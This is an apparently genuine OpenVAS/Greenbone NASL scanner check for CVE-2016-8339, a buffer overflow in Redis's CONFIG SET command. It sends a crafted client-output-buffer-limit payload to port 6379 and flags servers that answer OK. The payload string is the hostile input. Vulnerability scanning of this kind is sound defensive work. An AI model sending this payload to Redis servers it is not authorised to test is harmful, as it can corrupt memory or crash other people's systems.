# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:redis:redis";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809306");
  script_version("2025-03-20T05:38:32+0000");
  script_cve_id("CVE-2016-8339");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-03-20 05:38:32 +0000 (Thu, 20 Mar 2025)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2023-01-30 19:50:00 +0000 (Mon, 30 Jan 2023)");
  script_tag(name:"creation_date", value:"2016-11-03 15:17:52 +0530 (Thu, 03 Nov 2016)");
  script_name("Redis Server 'CONFIG SET' Command Buffer Overflow Vulnerability");

  script_tag(name:"summary", value:"Redis server is prone to a buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted 'CONFIG SET' command
  and check whether it is able to execute the command or not.");

  script_tag(name:"insight", value:"The flaw is due to an out of bounds
  write error existing in the handling of the client-output-buffer-limit
  option during the CONFIG SET command for the Redis data structure store.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute an arbitrary code.");

  script_tag(name:"affected", value:"Redis Server 3.2.x prior to 3.2.4");

  script_tag(name:"solution", value:"Upgrade to Redis Server 3.2.4 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.talosintelligence.com/reports/TALOS-2016-0206");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/93283");

  script_category(ACT_ATTACK);
  script_family("Databases");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_dependencies("gb_redis_detect.nasl");
  script_require_ports("Services/redis", 6379);
  script_mandatory_keys("redis/installed");

  exit(0);
}

include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

if(!soc = open_sock_tcp(port))
  exit(0);

## CONFIG SET  cmd's syntax
## 'CONFIG SET client-output-buffer-limit <class> <hard limit> <soft limit> <soft seconds>'
payload_cmd = 'CONFIG SET client-output-buffer-limit "master 3735928559 3405691582 373529054"\r\n';

## Executing the crafted command
send(socket:soc, data: payload_cmd);
recv = recv(socket:soc, length:1024);

close(soc);

## Vulnerable server respond with "OK"
if('-ERR Invalid argument' >!< recv && "OK" >< recv) {
  security_message(port:port);
  exit(0);
}

exit(99);
